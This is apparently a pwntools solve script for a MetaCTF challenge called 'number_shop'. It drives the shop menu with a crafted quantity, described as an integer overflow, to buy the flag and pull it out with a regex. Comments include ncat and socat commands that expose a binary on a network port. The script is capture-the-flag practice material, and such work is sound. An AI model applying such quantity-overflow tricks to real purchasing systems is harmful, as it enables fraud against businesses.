#!/usr/bin/python3
from pwn import *
import sys
import warnings
warnings.filterwarnings("ignore")

### +++++ CONFIG +++++

### GDB SCRIPT
gs = '''
#b * main
b * buy_number+268
#b * buy_flag
continue
'''

### LOADING AN ELF
elf = context.binary = ELF('./number_shop', checksec=False)

### TMUX CONFIGURE
context.terminal = ['tmux', 'splitw', '-hp', '70']
context.bits = 64

### DEBUGGING TYPE
def start(argv=[], *a, **kw):
        if args.GDB:  # Set GDBscript below
                return gdb.debug([elf.path] + argv, gdbscript=gs, *a, **kw)
        elif args.REMOTE:  # ('server', 'port')
                # while true; do ./ncat -lvp 8080 -e ./binary; sleep 1; done
                # socat TCP-LISTEN:8080,reuseaddr,fork EXEC:./binary
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        else:  # Run locally
                return process([elf.path] + argv, *a, **kw)

# We can't send null bytes as argv, so strip them strip(b'\x00')
r = start()

### +++++ EXPLOIT CODE +++++

intBof = 0x00

r.sendlineafter(b'>', '1')                                      # 1. Buy a number
r.sendlineafter(b'Choice>', '1')                                # 1. Buy an int
r.sendlineafter(b'How many would you like?>', f"{intBof}")      # value integer overflow
r.sendlineafter(b'>', '2')                                      # Buy a flag

# Recibe la salida después de comprar la flag
output = r.recvuntil(b'>', drop=False).decode()

# Buscar la flag usando regex
match = re.search(r'MetaCTF\{[^\}]+\}', output)
if match:
    log.success(f"FLAG: {match.group(0)}")
else:
    log.error("FLAG not found")

### +++++ INTERACTIVE +++++
r.interactive()
